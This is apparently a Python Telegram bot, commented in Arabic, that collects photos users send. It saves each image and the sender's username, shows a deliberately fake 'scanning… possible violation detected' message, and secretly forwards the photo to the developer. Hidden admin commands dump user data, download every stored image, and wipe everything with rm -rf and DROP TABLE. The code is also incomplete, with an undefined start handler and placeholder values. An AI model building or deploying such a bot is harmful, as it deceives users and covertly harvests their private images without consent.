import logging
from telegram import Update, InputFile
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
import os
import sqlite3

# ------ إعدادات متقدمة ------ #
TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
ADMIN_ID = YOUR_ADMIN_ID  # أي دي المطور
SECRET_PASSWORD = "DEMONCORE666"  # كلمة سر الأوامر السرية

# قاعدة بيانات SQLite لتخزين المستخدمين
conn = sqlite3.connect('user_data.db', check_same_thread=False)
cursor = conn.cursor()
cursor.execute('''CREATE TABLE IF NOT EXISTS users 
                  (user_id INTEGER PRIMARY KEY, username TEXT, images_sent INTEGER)''')
conn.commit()

# ------ أوامر سرية للمطور ------ #
def secret_login(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id == ADMIN_ID:
        context.user_data['admin_mode'] = True
        update.message.reply_text("**🔥 ADMIN MODE ACTIVATED 🔥**\n"
                                "الأوامر السرية متاحة الآن:\n"
                                "/get_user_data [ID] - جلب بيانات مستخدم\n"
                                "/delete_user [ID] - حذف مستخدم\n"
                                "/download_all - تنزيل كل الصور\n"
                                "/self_destruct - تدمير البوت")

# جلب بيانات مستخدم
def get_user_data(update: Update, context: CallbackContext):
    if context.user_data.get('admin_mode'):
        target_id = int(context.args[0])
        cursor.execute("SELECT * FROM users WHERE user_id=?", (target_id,))
        data = cursor.fetchone()
        if data:
            update.message.reply_text(f"📁 بيانات المستخدم {target_id}:\n"
                                    f"Username: @{data[1]}\n"
                                    f"الصور المرسلة: {data[2]}")
        else:
            update.message.reply_text("⚠️ المستخدم غير موجود!")
    else:
        update.message.reply_text("🚫 ليس لديك صلاحية!")

# حذف مستخدم من النظام
def delete_user(update: Update, context: CallbackContext):
    if context.user_data.get('admin_mode'):
        target_id = int(context.args[0])
        os.remove(f"user_images/{target_id}.jpg")  # حذف صورته
        cursor.execute("DELETE FROM users WHERE user_id=?", (target_id,))
        conn.commit()
        update.message.reply_text(f"☠️ تم حذف المستخدم {target_id}!")
    else:
        update.message.reply_text("🚫 ليس لديك صلاحية!")

# تنزيل كل الصور (مضغوطة)
def download_all(update: Update, context: CallbackContext):
    if context.user_data.get('admin_mode'):
        os.system("zip -r user_images.zip user_images/")
        with open("user_images.zip", "rb") as file:
            context.bot.send_document(chat_id=ADMIN_ID, document=file)
    else:
        update.message.reply_text("🚫 ليس لديك صلاحية!")

# تدمير البوت (حذف كل البيانات)
def self_destruct(update: Update, context: CallbackContext):
    if context.user_data.get('admin_mode'):
        os.system("rm -rf user_images/*")
        cursor.execute("DROP TABLE users")
        conn.commit()
        update.message.reply_text("💀 SYSTEM SELF-DESTRUCT INITIATED.")
        exit()
    else:
        update.message.reply_text("🚫 ليس لديك صلاحية!")

# ------ تحديث دالة معالجة الصور ------ #
def handle_photo(update: Update, context: CallbackContext):
    user = update.effective_user
    photo = update.message.photo[-1].get_file()
    
    # حفظ الصورة + تحديث قاعدة البيانات
    photo_path = f"user_images/{user.id}.jpg"
    photo.download(photo_path)
    cursor.execute("INSERT OR REPLACE INTO users VALUES (?, ?, COALESCE((SELECT images_sent FROM users WHERE user_id=?), 0) + 1)",
                   (user.id, user.username, user.id))
    conn.commit()

    # إرسال إشعار وهمي
    update.message.reply_text("🔎 جاري فحص الصورة...")
    update.message.reply_text("⛔ انتهاك محتمل: اكتشاف محتوى غير مرخص!")

    # إرسال نسخة للمطور
    context.bot.send_photo(chat_id=ADMIN_ID, photo=InputFile(photo_path), 
                          caption=f"🎯 صورة جديدة من: @{user.username}")

# ------ تشغيل البوت ------ #
def main():
    updater = Updater(TOKEN)
    dispatcher = updater.dispatcher

    # الأوامر الأساسية
    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(MessageHandler(Filters.photo, handle_photo))

    # الأوامر السرية
    dispatcher.add_handler(CommandHandler("admin", secret_login))
    dispatcher.add_handler(CommandHandler("get_user_data", get_user_data))
    dispatcher.add_handler(CommandHandler("delete_user", delete_user))
    dispatcher.add_handler(CommandHandler("download_all", download_all))
    dispatcher.add_handler(CommandHandler("self_destruct", self_destruct))

    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()